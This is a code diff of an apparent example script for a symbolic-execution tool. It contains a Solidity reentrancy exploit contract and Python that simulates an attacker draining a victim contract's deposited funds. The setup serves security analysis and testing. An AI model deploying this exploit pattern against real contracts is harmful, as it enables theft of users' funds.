@@ -37,14 +37,12 @@ exploit_source_code = '''
 pragma solidity ^0.4.15;
 
 contract GenericReentranceExploit {
-    event Log(string);
     int reentry_reps=10; 
-    address vulnerable_contract=0x4141414141414141;
+    address vulnerable_contract;
     address owner;
     bytes reentry_attack_string;
 
-    function GenericReentranceExploit(address _vulnerable_contract){
-        vulnerable_contract = _vulnerable_contract;
+    function GenericReentranceExploit(){
         owner = msg.sender;
     }
 
@@ -72,7 +70,6 @@ contract GenericReentranceExploit {
     function () payable{
         // reentry_reps is used to execute the attack a number of times
         // otherwise there is a loop between withdrawBalance and the fallback function
-        Log("Exploit default function!");
         if (reentry_reps > 0){
             reentry_reps = reentry_reps - 1;
             vulnerable_contract.call(reentry_attack_string);
@@ -85,79 +82,57 @@ contract GenericReentranceExploit {
 //9d15fd17: set_reentry_attack_string(bytes)
 //0d4b1aca: set_reentry_reps(int256)
 //beac44e7: set_vulnerable_contract(address)
-
 '''
 
-contract_bytecode = seth.compile(contract_source_code)
-exploit_bytecode = seth.compile(exploit_source_code)
 
-attacker_account = seth.create_account(balance=10)
-user_account = seth.create_account(balance=1000)
+#Initialize user and contracts
+user_account = seth.create_account(balance=100000000000000000)
+attacker_account = seth.create_account(balance=100000000000000000)
+contract_account = seth.solidity_create_contract(contract_source_code, owner=user_account) #Not payable
+exploit_account = seth.solidity_create_contract(exploit_source_code, owner=attacker_account)
 
 
-contract_account = seth.create_contract(owner=user_account, 
-                                        init=contract_bytecode)
-
-exploit_account = seth.create_contract(owner=attacker_account, 
-                                       init=exploit_bytecode+seth.pack_msb(contract_account))
+#User deposits all in contract
+print "[+] user deposited some."
+contract_account.addToBalance(value=100000000000000000)
 
 print "[+] Initial world state"
-print "    attacker_account %x balance: %d"% (attacker_account, seth.world.storage[attacker_account]['balance'])
-print "    exploit_account %x balance: %d"%  (exploit_account, seth.world.storage[exploit_account]['balance'])
-print "    user_account %x balance: %d"%  (user_account, seth.world.storage[user_account]['balance'])
-print "    contract_account %x balance: %d"%  (contract_account, seth.world.storage[contract_account]['balance'])
+print "     attacker_account %x balance: %d"% (attacker_account, seth.get_balance(attacker_account))
+print "     exploit_account %x balance: %d"%  (exploit_account, seth.get_balance(exploit_account))
+print "     user_account %x balance: %d"%  (user_account, seth.get_balance(user_account))
+print "     contract_account %x balance: %d"%  (contract_account, seth.get_balance(contract_account))
+
 
 
 print "[+] Setup the exploit"
-print "    Setting attack string to 32 symbolic bytes"
-seth.transaction(  caller=attacker_account,
-                        address=exploit_account,
-                        data=seth.make_function_call("set_reentry_attack_string(bytes)", seth.SByte(32)),
-                        value=0)
+exploit_account.set_vulnerable_contract(contract_account)
 
-#User deposits all in contract
-print "[+] Make the victim user interact with the buggy contract"
-print "    We hope for some funds to be transferred."
-seth.transaction(  caller=user_account,
-                    address=contract_account,
-                    data=seth.SByte(64),
-                    value=1000)
+print "\t Setting 30 reply reps"
+exploit_account.set_reentry_reps(30)
 
-print "[+] Attacker tx1 via exploit contract"
-seth.transaction(  caller=attacker_account,
-                    address=exploit_account,
-                    data=seth.make_function_call('delegate(bytes)', seth.SByte(64)),
-                    value=10)
+print "\t Setting reply string"
+exploit_account.set_reentry_attack_string(seth.SByte(38))
 
-        
-print "[+] Attacker tx2 via exploit contract"
-seth.transaction(  caller=attacker_account,
-                    address=exploit_account,
-                    data=seth.make_function_call('delegate(bytes)', seth.SByte(64)),
-                    value=0)
+#Attacker is
+print "[+] Attacker first transaction"
+exploit_account.delegate(seth.SByte(38), value=seth.SValue)
 
+print "[+] Attacker second transaction" 
+exploit_account.delegate(seth.SByte(38))
 
-print "[+] Attacker tx3 via exploit contract"
-seth.transaction(  caller=attacker_account,
-                    address=exploit_account,
-                    data=seth.make_function_call('delegate(bytes)', seth.SByte(64)),
-                    value=0)
+print "[+] The attacker destroys the exploit contract and profit" 
+exploit_account.get_money()
 
-print "[+] Let attacker destroy the exploit and profit" 
-seth.transaction(  caller=attacker_account,
-                    address=exploit_account,
-                    data=seth.make_function_call('get_money()'),
-                    value=0)
+#print "[+] There are %d reverted states now"% len(seth.final_state_ids)
+#for state_id in seth.final_state_ids:
+#     seth.report(state_id)
 
-#Finish exploration Report on what we found.
-
-print "[+] There are %d reverted states now. (skipping)"% len(seth.final_state_ids)
 print "[+] There are %d alive states now"% (len(seth.running_state_ids))
 for state_id in seth.running_state_ids:
-    seth.report(state_id, ty='SELFDESTRUCT')
+    seth.report(state_id)
 
-print "[+] Global coverage: %x"% contract_account
-print seth.coverage(contract_account)
+print "[+] Global coverage:"
+print seth.coverage(contract_account, ty='SUICIDE')
 
 
 
